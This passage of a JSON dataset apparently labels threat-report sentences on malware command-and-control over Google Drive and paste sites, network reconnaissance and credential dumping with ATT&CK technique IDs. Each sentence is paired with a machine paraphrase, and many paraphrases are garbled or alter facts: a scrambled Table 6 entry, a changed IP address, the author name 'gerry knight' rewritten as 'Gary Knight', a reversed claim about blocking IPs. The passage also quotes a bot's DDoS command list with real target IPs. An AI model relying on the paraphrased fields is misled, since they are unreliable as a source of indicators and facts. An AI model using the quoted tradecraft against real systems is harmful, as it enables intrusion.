            "en_text": "This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API",
            "data_text": "This command is especially useful because it activates alternate commands and control channels that use the Google Drive API."
        }
    ],
    "To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account": [
        {
            "tec_id": "T1102",
            "en_text": "To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account",
            "data_text": "To use Google Drive, the x_mode command received from the C2 server via DNS tunneling is followed by a new list of settings required to interact with your Google Drive account."
        }
    ],
    "Figure 4 x_mode command and new line delimited settings As seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive": [
        {
            "tec_id": "T1102",
            "en_text": "Figure 4 x_mode command and new line delimited settings As seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive",
            "data_text": "Figure 4 x_mode command and new line separated settings As shown in Figure 4, settings are stored in the variables shown in Table 6, which are used to authenticate worker-controlled Google accounts before uploading and downloading files from Google Drive."
        }
    ],
    "Variable Name Description   gdu Google Drive URL for downloading files to the Google Drive account   gduu Google Drive URL for uploading files to the Google Drive account   gdue Google Drive URL for updating a file on the Google Drive account   gdo2t Google Drive URL used to get the OAUTH access_token   client_id The client_id for the OAUTH application   cs The client_secret for OAUTH   r_t The refresh_token for OAUTH    Table 6 Variables used to store settings needed to use Google Drive as a C2 To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data": [
        {
            "tec_id": "T1102",
            "en_text": "Variable Name Description   gdu Google Drive URL for downloading files to the Google Drive account   gduu Google Drive URL for uploading files to the Google Drive account   gdue Google Drive URL for updating a file on the Google Drive account   gdo2t Google Drive URL used to get the OAUTH access_token   client_id The client_id for the OAUTH application   cs The client_secret for OAUTH   r_t The refresh_token for OAUTH    Table 6 Variables used to store settings needed to use Google Drive as a C2 To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data",
            "data_text": "Variable name description for downloading files to Google Drive account gdu Google Drive URL for uploading files to Google Drive account gdu Google Drive URL, Google Drive account gdo2t Google Drive URL for importing OAUTH access_token client_id for OAUTH.Tionscs The client_secret for OAUTH r_t Google Drive is used to store the settings required to use C2 in the OAUTH Table 6 variable and Trojan sends a request to grant_type, client_cse_line HTTPcOST to the URL stored in the gdo2t variable to authenticate the Google account.Cret and refresh_token fields added to HTTP headers and POST data"
        }
    ],
    "Figure 6 Hardcoded Google Drive URL used in RogueRobin sample When the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive": [
        {
            "tec_id": "T1102",
            "en_text": "Figure 6 Hardcoded Google Drive URL used in RogueRobin sample When the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive",
            "data_text": "Figure 6 If the modification_time of the first file of the hard-coded Google Drive URL used in the Rogue Robin sample changes, the Trojan will download the contents of the first file uploaded to the Google drive."
        }
    ],
    "To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c.<C2 domain> The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier": [
        {
            "tec_id": "T1102",
            "en_text": "To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c.<C2 domain> The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier",
            "data_text": "To obtain work from your Google Drive account, the Trojan begins with creating a string with the following structure for each element within the subdomain that is subject to character replacement in Table 4. c<Unique identifier><Task identifier padded with '0' to create 3 digits><sequence number>c.<C2 Domain> The Trojan horse gets an OAUTH access token for the Google drive in the same way it did before when it got a unique identifier."
        }
    ],
    "Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure": [
        {
            "tec_id": "T1102",
            "en_text": "Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure",
            "data_text": "Finally, a new variant of Rogue Robin can use Google Drive cloud services for C2 channels, suggesting that Dark Hydrus is shifting to abusing legitimate cloud services for infrastructure."
        }
    ],
    "The Delphi variant of Cannon does not use legitimate web-based email services for its C2 communications, instead opting to use email accounts at an actor owned domain, ambcomission[.]com": [],
    "Then pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com and pomf.cat were used as channels for the different malware stages before achieving a full RAT implementation, which then communicates with the corresponding C2 server": [
        {
            "tec_id": "T1102",
            "en_text": "Then pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com and pomf.cat were used as channels for the different malware stages before achieving a full RAT implementation, which then communicates with the corresponding C2 server",
            "data_text": "pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com, pomf.cat, and pomf.cat are then used as channels for different levels of malware to communicate with their C2 servers before fully implementing RAT."
        }
    ],
    "However, the attacks different stages were hosted on a variety of free sites such as Mailimg, Github, Pastebin, dev-point.co, a.pomf.cat, and upload.cat": [
        {
            "tec_id": "T1102",
            "en_text": "However, the attacks different stages were hosted on a variety of free sites such as Mailimg, Github, Pastebin, dev-point.co, a.pomf.cat, and upload.cat",
            "data_text": "However, the attacks took place on various free sites such as Mailimg, Github, Pastebin, dev-point.co, a.pomf.cat, and upload.cat."
        }
    ],
    "The command index table and command handler address table.  Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks:  Recursively generate a list of files in a directory and send to the control server Terminate a specific process": [
        {
            "tec_id": "T1102",
            "en_text": "The command index table and command handler address table.  Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks:  Recursively generate a list of files in a directory and send to the control server Terminate a specific process",
            "data_text": "Command index table and command handler address table. Based on the response received from the implant function control server, malware can perform the following malicious actions: Repeatedly create and send a list of files in the directory to the control server Terminate a specific process"
        }
    ],
    "The actor has the following demonstrated capabilities:To include exploits (for Hangul and Microsoft Office) in its workflows.To modify its campaigns by splitting the payload in to multiple stages To use compromised web servers or legitimate cloud based platforms": [
        {
            "tec_id": "T1102",
            "en_text": "The actor has the following demonstrated capabilities:To include exploits (for Hangul and Microsoft Office) in its workflows.To modify its campaigns by splitting the payload in to multiple stages To use compromised web servers or legitimate cloud based platforms",
            "data_text": "The actor has the following proven features:Include attacks (for Hangul and Microsoft Office) in the workflow.To modify a campaign by splitting the payload into stages To use a corrupted web server or a legitimate cloud-based platform"
        }
    ],
    "Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire": [
        {
            "tec_id": "T1102",
            "en_text": "Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire",
            "data_text": "The following is a list of platforms used in this variant. Twitter, Yandex, Media Fire"
        }
    ],
    "The majority of documents used the name “gerry knight” for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names": [
        {
            "tec_id": "T1102",
            "en_text": "The majority of documents used the name “gerry knight” for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names",
            "data_text": "Most documents used the name \"Gary Knight\" in the author field of the document metadata, and embedded macros used direct IP connections to the command and control (C2) server instead of using domain names."
        }
    ],
    "It has historically leveraged legitimate third-party websites to host the malware’s command and control (C2) information, acting as “dead drops”": [
        {
            "tec_id": "T1102",
            "en_text": "It has historically leveraged legitimate third-party websites to host the malware’s command and control (C2) information, acting as “dead drops”",
            "data_text": "He used historically legitimate third-party websites to host command and control (C2) information for malware, acting as \"dead drops.\""
        }
    ],
    "This tactic uses public web services to host content that contains encoded commands that are decoded by the malware": [
        {
            "tec_id": "T1102",
            "en_text": "This tactic uses public web services to host content that contains encoded commands that are decoded by the malware",
            "data_text": "This strategy uses a public web service to host content that contains encoded instructions decoded by malware."
        }
    ],
    "This can be seen in the following images taken from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the dead drop resolvers we encountered in this sample:  Figure 7 Dead drop resolver used by BADNEWS   In order to decrypt this data, the authors have included additional steps from previous versions": [],
    "One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server": [
        {
            "tec_id": "T1102",
            "en_text": "One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server",
            "data_text": "One of the malware families attached to this group, BADNEWS, continues to update not only on how to communicate with remote C2 servers, but also on how to use a dead drop resolver."
        }
    ],
    "Some of the targeted apps were:    Whatsapp  YouTube Video Downloader  Google Update   Instagram  Hack Wifi   AirDroid   WifiHacker     Facebook   Photoshop   SkyTV     Hotstar  Trump Dash   PokemonGo  With many more to come": [
        {
            "tec_id": "T1102",
            "en_text": "Some of the targeted apps were:    Whatsapp  YouTube Video Downloader  Google Update   Instagram  Hack Wifi   AirDroid   WifiHacker     Facebook   Photoshop   SkyTV     Hotstar  Trump Dash   PokemonGo  With many more to come",
            "data_text": "Some of the target apps are as follows. Whatsapp YouTube Video Downloader Google Update Instagram Hack WiFi AirDroid WiFi Hacker Facebook Photoshop SkyTV Hotstar Trump Dash Pokemon Coming Soon"
        }
    ],
    "Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal": [
        {
            "tec_id": "T1102",
            "en_text": "Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal",
            "data_text": "Receive C2 commands from user profiles created by opponents on legitimate websites/forums such as Github and Microsoft TechNet portals"
        }
    ],
    "An increasingly popular tactic by threat actors is to use legitimate hosting services like Google Cloud or CloudFlare for their payload and C2  infrastructure, making it much more difficult to safely block IPs": [
        {
            "tec_id": "T1102",
            "en_text": "An increasingly popular tactic by threat actors is to use legitimate hosting services like Google Cloud or CloudFlare for their payload and C2  infrastructure, making it much more difficult to safely block IPs",
            "data_text": "The strategy increasingly used by threat actors is to securely block IP using legitimate hosting services such as Google Cloud or CloudFlare for payloads and C2 infrastructure."
        }
    ],
    "Hidden Content The primary command and control location used in this campaign is hosted on a blog on blogspot[.]com, which enables the threat actors to hide their malicious content behind a legitimate service": [
        {
            "tec_id": "T1102",
            "en_text": "Hidden Content The primary command and control location used in this campaign is hosted on a blog on blogspot[.]com, which enables the threat actors to hide their malicious content behind a legitimate service",
            "data_text": "Hidden Content The default command and control location used in this campaign is hosted on a blog in blog spot [.com], allowing threatening actors to hide malicious content behind legitimate services."
        }
    ],
    "In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com": [
        {
            "tec_id": "T1102",
            "en_text": "In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com",
            "data_text": "In some cases, you have downloaded and run content hosted on the paste site hxxps://pastbin[.com] using the encoded PowerShell command."
        }
    ],
    "five threads are for forwarding collected data to four cloud services (Box, Dropbox, Pcloud and Yandex). When uploading stolen data to a cloud service": [
        {
            "tec_id": "T1102",
            "en_text": "five threads are for forwarding collected data to four cloud services (Box, Dropbox, Pcloud and Yandex). When uploading stolen data to a cloud service",
            "data_text": "The five threads are intended to deliver the collected data to four cloud services (Box, Dropbox, Pcloud, and Yandex). When uploading stolen data to the cloud service"
        }
    ],
    "The group also used GitHub as a repository for tools that it downloaded post-compromise.": [
        {
            "tec_id": "T1102",
            "en_text": "The group also used GitHub as a repository for tools that it downloaded post-compromise.",
            "data_text": "The group also used GitHub as a repository for tools downloaded after post-damage."
        }
    ],
    "Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'": [
        {
            "tec_id": "T1018",
            "en_text": "Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'",
            "data_text": "Additional tools, including network discovery/collection tools, archive tools WinRAR, custom Microsoft SharePoint enumeration, and data dumping tools ('spwebmember') have been recovered during the incident."
        }
    ],
    "Once inside the network of a hospitality company, APT28 sought out machines that controlled both guest and internal Wi-Fi networks. No guest credentials were observed being stolen at the compromised hotels; however, in a separate incident that occurred in Fall 2016, APT28 gained initial access to a victim’s network via credentials likely stolen from a hotel Wi-Fi network.  Upon gaining access to the machines connected to corporate and guest Wi-Fi networks, APT28 deployed Responder": [
        {
            "tec_id": "T1018",
            "en_text": "Once inside the network of a hospitality company, APT28 sought out machines that controlled both guest and internal Wi-Fi networks. No guest credentials were observed being stolen at the compromised hotels; however, in a separate incident that occurred in Fall 2016, APT28 gained initial access to a victim’s network via credentials likely stolen from a hotel Wi-Fi network.  Upon gaining access to the machines connected to corporate and guest Wi-Fi networks, APT28 deployed Responder",
            "data_text": "Once inside a hospitality company's network, APT28 found a machine that controls both guest and internal Wi-Fi networks. No guest credentials were observed stolen from the damaged hotel. However, in a separate incident that occurred in the fall of 2016, APT28 first accessed the victim's network through credentials that appeared to have been stolen.It's a hotel Wi-Fi network. After accessing systems connected to enterprise and guest Wi-Fi networks, APT28 deployed Responder."
        }
    ],
    "At a high-level, their targeting of financial organizations and subsequent heists have followed the same general pattern:   Information Gathering: Conducted research into an organization’s personnel and targeted third party vendors with likely access to SWIFT transaction systems to understand the mechanics of SWIFT transactions on victim networks (Please note: The systems in question are those used by the victim to conduct SWIFT transactions": [
        {
            "tec_id": "T1018",
            "en_text": "At a high-level, their targeting of financial organizations and subsequent heists have followed the same general pattern:   Information Gathering: Conducted research into an organization’s personnel and targeted third party vendors with likely access to SWIFT transaction systems to understand the mechanics of SWIFT transactions on victim networks (Please note: The systems in question are those used by the victim to conduct SWIFT transactions",
            "data_text": "At a high level, their targeting of financial institutions and subsequent extortionists follows the same general pattern. Gather information: To understand the mechanisms of SWIFT transactions in the victim network, conduct a survey of personnel and third-party vendors who may have access to the SWIFT transaction system (Note: the system in question was used by the victim to conduct SWIFT transactions)."
        }
    ],
    "Host enumeration and lateral movement After gaining an initial foothold in a compromised environment, the threat actors quickly identify and explore accessible systems": [
        {
            "tec_id": "T1018",
            "en_text": "Host enumeration and lateral movement After gaining an initial foothold in a compromised environment, the threat actors quickly identify and explore accessible systems",
            "data_text": "Host enumeration and lateral movement threat actors quickly identify and navigate accessible systems after gaining an initial foundation in a compromised environment."
        }
    ],
    "In one example, BRONZE UNION actors leveraged initial web shell access on Internet-facing systems to conduct internal reconnaissance, including domain enumeration and network state, via ipconfig, net use, net user, and net view commands": [
        {
            "tec_id": "T1018",
            "en_text": "In one example, BRONZE UNION actors leveraged initial web shell access on Internet-facing systems to conduct internal reconnaissance, including domain enumeration and network state, via ipconfig, net use, net user, and net view commands",
            "data_text": "For example, bronze union actors performed internal reconnaissance, including domain enumeration and network status, via the ipconfig, net use, netuser, and netview commands using initial web shell access on Internet-based systems."
        }
    ],
    "The Trojan checks to see if the result of this query returned a class with more than 0 elements, which would most likely be true in a non-virtual environment": [
        {
            "tec_id": "T1018",
            "en_text": "The Trojan checks to see if the result of this query returned a class with more than 0 elements, which would most likely be true in a non-virtual environment",
            "data_text": "The Trojan checks whether a class with 0 or more elements has been returned as a result of this query. This class is likely to be returned in a non-virtual environment."
        }
    ],
    "The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document": [
        {
            "tec_id": "T1018",
            "en_text": "The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document",
            "data_text": "The main difference is that the sample is encrypted and password protected, so the victim must enter a password that appears to have been provided by the other party to view the document."
        }
    ],
    "This technique allows them to map network resources and make lateral movements inside the network, landing in the perfect machine to match the attacker’s interest": [
        {
            "tec_id": "T1018",
            "en_text": "This technique allows them to map network resources and make lateral movements inside the network, landing in the perfect machine to match the attacker’s interest",
            "data_text": "This technology allows you to map network resources, move transversely within the network, and land on a complete machine that suits the interests of an attacker."
        }
    ],
    "(Source: Dell SecureWorks) Over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance": [
        {
            "tec_id": "T1018",
            "en_text": "(Source: Dell SecureWorks) Over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance",
            "data_text": "(Source: Dell SecureWorks) Threat Actors install remote access tools on additional systems based on network reconnaissance results for several days."
        }
    ],
    "The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'": [
        {
            "tec_id": "T1003",
            "en_text": "The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'",
            "data_text": "The tool runs a query that connects to the SQL SharePoint database and dumps all data in the database to a temporary file with 'spdata' attached."
        }
    ],
    "APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets": [
        {
            "tec_id": "T1003",
            "en_text": "APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets",
            "data_text": "APT15 has also been observed using Mimikatz to dump credentials and generate Kerberos golden tickets."
        }
    ],
    "During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump": [
        {
            "tec_id": "T1003",
            "en_text": "During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump",
            "data_text": "During the privilege escalation, in addition to legitimate tools such as Windows Credential Editor and ProDump, freely available tools such as Mimi Katsu and Ncrack were observed."
        }
    ],
    "APT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors": [
        {
            "tec_id": "T1003",
            "en_text": "APT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors",
            "data_text": "The APT40 utilizes custom credential theft utilities such as HOMEFRI, a password dumper/cracker used in conjunction with AIRBREAK and BADFLICK backdoor."
        }
    ],
    "NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:  Login passwords of remote computers on LAN": [
        {
            "tec_id": "T1003",
            "en_text": "NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:  Login passwords of remote computers on LAN",
            "data_text": "NetPass is a free network password recovery tool that, according to developer Nirsoft, allows you to recover the following passwords:"
        }
    ],
    "Our observation of related actions here:    u ps start password stealing (Windows)   Ps_mps/ps_hwi start start password stealing (Linux, MIPS,  ARM)   uper_mps/uper_hwi start rewrite hook module with a new version and launch it (Linux, MIPS, ARM)   Nm_mps/nm_hwi start  –ban -middle Scan ports and retrieve banners on the router subnet  (Linux, MIPS,  ARM)   U fsget * 7 *.docx, *.pdf, *.doc * search for docs with the given filetypes (Windows)   S sinfo retrieve information on installed programs and launch commands: systeminfo, tasklist, ipconfig, netstat, route print, tracert www.google.com (Windows)   weap_mps/weap_hwi host188.128.123.52 port[25,26,110,465,995]  typetcpconnect DDoS on 188.128.123.52 (Linux, MIPS,  ARM)   weap_mps/weap_hwi  typesynflood port80 cnt100000 spdmedium host212.175.109.10 DDoS on 212.175.109.10 (Linux, MIPS,  ARM)    The issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM devices. We want to pay special attention to the DDoS commands meant for these routers": [],
    "The information contained in this data dump include:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group": [
        {
            "tec_id": "T1003",
            "en_text": "The information contained in this data dump include:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group",
            "data_text": "The information contained in this data dump is as follows: Stolen Credentials Place potential system web shell URLs with stolen credentials Backdoor tools Command and control server components in the backdoor tool Screenshot of the OilRig operating system identifying specific individual operators Unknown entity appears in mid-March 2019.@Mr_L4nist3r In several hacking forums and tweets with user handles, they claimed that they had access to internal tools and data used by the OilRig group."
        }
    ],
    "The datasets included:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs)": [
        {
            "tec_id": "T1003",
            "en_text": "The datasets included:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs)",
            "data_text": "The data set included: Stolen Credentials Place potential system web shell URLs with stolen credentials Backdoor tools Command and control server components DNS hijacking scripts for backdoor tools Analyze each data set type other than a screenshot document for the OilRig operating system.Contains details of suspected oil rig operators and maintains consistency with previously observed oil rig tactics, techniques and procedures (TTPs)."
        }
    ],
    "In total, nearly 13,000 sets of credentials are included in the data dump": [
        {
            "tec_id": "T1003",
            "en_text": "In total, nearly 13,000 sets of credentials are included in the data dump",
            "data_text": "A total of approximately 13,000 sets of credentials are included in the data dump."
        }
    ],
    "The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz": [
        {
            "tec_id": "T1003",
            "en_text": "The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz",
            "data_text": "This credential appears to have been stolen through several techniques, including the use of post-attack password recovery tools such as MimiKatz and JuMimiKatz."
        }
    ],
    "In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017": [
        {
            "tec_id": "T1003",
            "en_text": "In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017",
            "data_text": "In addition to these tools, OilRig attackers acquired their credentials through a traditional credential collection toolkit, as discussed in the Striking Oil blog published in September 2017."
        }
    ],
    "It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump": [
        {
            "tec_id": "T1003",
            "en_text": "It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump",
            "data_text": "An organization dumped the entire Active Directory, taking up most of the credentials found in the data dump."
        }
    ],
    "We are unable to confirm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid": [
        {
            "tec_id": "T1003",
            "en_text": "We are unable to confirm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid",
            "data_text": "Although it is not possible to verify that all stolen credential sets are actually valid credentials, previously observed activities, timestamps, and known behavior indicate that these credentials are likely to be valid or still valid."
        }
    ],
    "Assuming the lists of credentials are valid, the mass collection confirms our hypothesis that the OilRig group maintains a heavy emphasis on credential based attacks along with the other types of attacks they deploy": [
        {
            "tec_id": "T1003",
            "en_text": "Assuming the lists of credentials are valid, the mass collection confirms our hypothesis that the OilRig group maintains a heavy emphasis on credential based attacks along with the other types of attacks they deploy",
            "data_text": "Assuming a list of credentials is valid, we confirm our hypothesis that bulk collection focuses on credential-based attacks, along with other types of attacks distributed by the OilRig group."
        }
    ],
    "When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials": [
        {
            "tec_id": "T1003",
            "en_text": "When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials",
            "data_text": "When you enter this credential, it is sent to the C2 server so that Dark Hydrus can collect user account credentials."
        }
    ],
    "Credential Harvesting Attack On June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East": [
        {
            "tec_id": "T1003",
            "en_text": "Credential Harvesting Attack On June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East",
            "data_text": "On June 24, 2018, Unit 42 observed Dark Hydrus conducting a credential-collecting attack on an educational institution in the Middle East."
        }
    ],
    "Figure 2 Employee survey displayed after credential theft The November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3": [
        {
            "tec_id": "T1003",
            "en_text": "Figure 2 Employee survey displayed after credential theft The November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3",
            "data_text": "Figure 2 Employee Survey After Credential Stolen The November 2017 document displays a password handover document after credential theft occurs (see Figure 3"
        }
    ],
    "Figure 3 Password handover form displayed after credential theft The infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150": [
        {
            "tec_id": "T1003",
            "en_text": "Figure 3 Password handover form displayed after credential theft The infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150",
            "data_text": "Figure 3 Password handover form shown after credential theft The infrastructure used for these credential collection attacks used domain 0utl00k[].Resolved at 107.175.150[.113 and 195.165.41[.]150 at the time of the attack."
        }
    ]
}